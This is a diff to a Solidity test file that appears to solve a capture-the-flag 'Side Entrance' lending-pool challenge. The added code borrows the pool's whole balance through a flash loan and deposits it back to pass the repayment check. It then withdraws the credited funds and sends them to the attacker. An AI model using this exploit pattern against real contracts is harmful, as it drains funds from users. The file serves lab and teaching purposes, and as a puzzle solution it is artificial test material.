@@ -34,9 +34,18 @@ contract SideEntrance is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
-
+        uint256 balance = address(sideEntranceLenderPool).balance;
+        sideEntranceLenderPool.flashLoan(balance);
+        sideEntranceLenderPool.withdraw();
+        attacker.transfer(balance);
         /** EXPLOIT END **/
         validation();
+    }
+
+    receive() external payable {}
+
+    function execute() external payable {
+        sideEntranceLenderPool.deposit{value: msg.value}();
     }
 
     function validation() internal {
